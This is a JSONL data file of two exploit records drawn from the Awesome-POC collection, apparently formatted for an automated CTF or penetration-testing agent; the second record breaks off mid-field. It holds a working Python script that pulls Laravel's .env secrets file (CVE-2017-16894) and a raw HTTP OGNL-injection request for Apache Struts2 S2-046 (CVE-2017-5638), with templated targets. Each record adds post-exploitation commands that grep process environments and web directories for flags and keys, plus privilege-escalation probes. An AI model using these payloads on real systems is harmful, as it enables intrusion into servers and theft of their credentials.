{"id": "awesome-poc:cve-2017-16894", "kind": "poc", "title": "Laravel .env 配置文件泄露 CVE-2017-16894", "technique": "unknown", "summary": "开发框架漏洞 / CVE-2017-16894。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2017-16894 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["开发框架漏洞", "CVE-2017-16894"], "payload_template": "import requests\nimport sys\nfrom requests.packages.urllib3.exceptions import InsecureRequestWarning\n\ndef title():\n    print('+------------------------------------------')\n    print('+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m')\n    print('+  \\033[34mVersion: Laravel framework <= 5.5.21                              \\033[0m')\n    print('+  \\033[36m使用格式:  python3 poc.py                                            \\033[0m')\n    print('+  \\033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \\033[0m')\n    print('+------------------------------------------')\n\ndef POC_1(target_url):\n    vuln_url = target_url + \"/.env\"\n    headers = {\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\",\n    }\n    try:\n        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n        response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)\n        if \"APP_NAME\" in response.text:\n            print(\"\\033[32m[o] 目标{}存在漏洞 \\033[0m\".format(target_url))\n            print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text))\n        else:\n            print(\"\\033[31m[x] .env 文件请求失败 \\033[0m\")\n            sys.exit(0)\n    except Exception as e:\n        print(\"\\033[31m[x] 请求失败 \\033[0m\", e)\n\nif __name__ == '__main__':\n    title()\n    target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\"))\n    POC_1(target_url)", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2017-16894 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先 `printenv | grep -i -e flag -e ctf` —— 进程环境是最快的来源。", "再 `ls -la /` 与 `grep -rIl -e 'CTF{' -e 'flag{' /var/www /tmp /opt 2>/dev/null` —— 文件名常不含 flag。", "全空就判断提权路径（`id`/`sudo -l`/SUID），无路可上就停止并报告，不要重复同一请求。"], "provenance": {"source_type": "reference-corpus", "source_ref": "awesome-poc", "source_url": "https://github.com/Threekiii/Awesome-POC", "notes": "提取自 开发框架漏洞/Laravel .env 配置文件泄露 CVE-2017-16894.md 的复现段落"}, "trust_level": "unverified", "verified_solve": false, "published_at": null}
{"id": "awesome-poc:cve-2017-5638", "kind": "poc", "title": "Apache Struts2 S2-046 远程代码执行漏洞 CVE-2017-5638", "technique": "rce", "summary": "中间件漏洞 / CVE-2017-5638。载荷取自 Awesome-POC 的复现段落，已按实例值参数化。", "preconditions": ["目标产品与版本需落在 CVE-2017-5638 的影响范围内（先确认版本，再发载荷）", "载荷中的 {{host}} / {{target_url}} 按实际目标替换"], "target_stack": ["中间件漏洞", "CVE-2017-5638"], "payload_template": "import socket\n\nq = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2\nContent-Disposition: form-data; name=\"upload\"; filename=\"%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\\x00b\"\nContent-Type: text/plain\n\nfoo\n------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\\n', b'\\r\\n')\np = b'''POST / HTTP/1.1\nHost: {{host}}\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.8,es;q=0.6\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2\nContent-Length: %d\n\n'''.replace(b'\\n', b'\\r\\n') % (len(q), )\n\nwith socket.create_connection(('{{target_url}}', '8080'), timeout=5) as conn:\n    conn.send(p + q)\n    print(conn.recv(10240).decode())", "verification_method": ["按 payload 原样发送；命中判据是响应出现该 CVE 的预期特征（回显、报错或读到的文件内容）。", "第一次没有预期响应时换下一条载荷，不要在同一句上反复微调。"], "known_failures": ["机制导入，从未在本平台靶机上验证过；版本不符时不会生效。"], "steps": ["确认目标版本在 CVE-2017-5638 影响范围内", "把 payload 中的占位符换成实际目标", "发送并把响应与预期特征比对"], "post_exploitation": ["先读进程环境再翻文件：`printenv | grep -i -e flag -e ctf -e key` —— 多数镜像把 flag 导出到 web 进程环境，这一步最快。", "环境为空就按内容搜而非名字：`grep -rIl -e 'CTF{' -e 'flag{' /var/www /srv /opt /tmp /usr/local /home 2>/dev/null` —— 文件名常是 fl4g/f1ag 或无提示名。", "仍为空就判断能否提权：`id; sudo -l; find / -perm -4000 -type f 2>/dev/null; cat /proc/version`；`/root` 常 0700、`/proc/1/environ` 常 0400，读不到就是读不到。"], "provenance": {"s